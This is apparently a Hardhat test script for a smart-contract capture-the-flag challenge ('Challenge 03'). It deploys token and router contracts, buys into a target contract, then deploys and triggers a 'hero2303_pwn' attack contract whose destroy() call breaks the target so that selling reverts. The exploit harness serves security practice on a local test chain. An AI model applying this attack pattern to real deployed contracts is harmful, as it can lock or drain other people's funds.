const { expect } = require("chai");
const { ethers, waffle } = require("hardhat");
const fs = require('fs');


let wmel_contract = 0;
let kwike_factory_contract = 0;
let kwike_router_contract = 0;

async function checkAddressFromFile(contractName) {
  const filePath = `./addresses/${contractName}.txt`;

  if (fs.existsSync(filePath)) {
      const address = fs.readFileSync(filePath, 'utf8');
      console.info(`[+] ${contractName} found @ ${address}`);
      return address;
  }

  return null;
}

// async function depositAs(as, val) {


//   console.log("[ERC20] User", as.address, "depositing", percent, "% of wallet (", weiToEther(val), ") in WMEL")


//   let overrides = {
//       value: val
//   };

//   // Deposit BNB to have WBNB
//   res = await wmel_contract.deposit(overrides);

//   return res;
// }

async function deploy(contractName, args = []) {
  const contractFactory = await ethers.getContractFactory(contractName);

  const contract = await contractFactory.deploy(...args);
  await contract.deployed();

  return contract;
}

async function deployAll() {
  console.log("[+] Deploying contracts !");

  wmel_contract = await deploy("WMEL");
  kwike_factory_contract = await deploy("KwikEFactory", ["0x9FcF309dC7c97343328d03c1D834d0147076076c"]);
  kwike_router_contract = await deploy("KwikERouter", [kwike_factory_contract.address, wmel_contract.address]);

}

async function depositAs(as, val) {

  let overrides = {
      value: val
  };

  console.log("depositing")
  // Deposit BNB to have WBNB

  let res = await wmel_contract.deposit(overrides);

  console.log("depositok")

  return res;
}

async function do_a_swap(amount_in, slipp, path) {
  //         IPancakeRouter02(PANCAKESWAP_ROUTER).swapExactTokensForTokensSupportingFeeOnTransferTokens(_amountIn, minAmountWithSlippage, path, address(this), block.timestamp);

  let min_tokens = await kwike_router_contract.getAmountsOut(amount_in, path);


  let slippage = ethers.BigNumber.from(slipp).mul(100);
  let val1 = min_tokens[1];
  let min_slippage = val1.mul(slippage).div(ethers.BigNumber.from(10000))
  let res = 0;
  try {
      res = await kwike_router_contract.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount_in, min_slippage, [path[0], path[1]], "0x9FcF309dC7c97343328d03c1D834d0147076076c", Math.floor(Date.now() / 1000) + 60 * 10);
      await res.wait();
  } catch (error) {
      console.log("ERROR ON SWAP", error);
      return;
  }

  return res;
}


describe("Challenge 03", function () 
{
  it("Should deploy the contract, create the pair, add liquidity, pwn the ERC20 (have less than 0.5 ETH left)", async function ()
  {
    
    await deployAll();
    const challenge03 = await ethers.getContractFactory("hero2303");
    const challenge03_contract = await challenge03.deploy();
    await challenge03_contract.deployed();

    console.log("Contract deployed to ", challenge03_contract.address);


    let overrides = {
      value : ethers.utils.parseEther("2.0")
    }
    
    let tx0 = await challenge03_contract.buy(2, overrides=overrides)

    await tx0.wait();

    overrides = {
      value : ethers.utils.parseEther("0.025")
    }

    const challenge03_pwn = await ethers.getContractFactory("hero2303_pwn");
    const challenge03_pwn_contract = await challenge03_pwn.deploy(overrides);
    await challenge03_pwn_contract.deployed();

    tx0 = await challenge03_pwn_contract.destroy(challenge03_contract.address);

    await tx0.wait();
    
    await expect(challenge03_contract.sell(2)).to.be.revertedWith("panic code 0x1")





    
  });
});
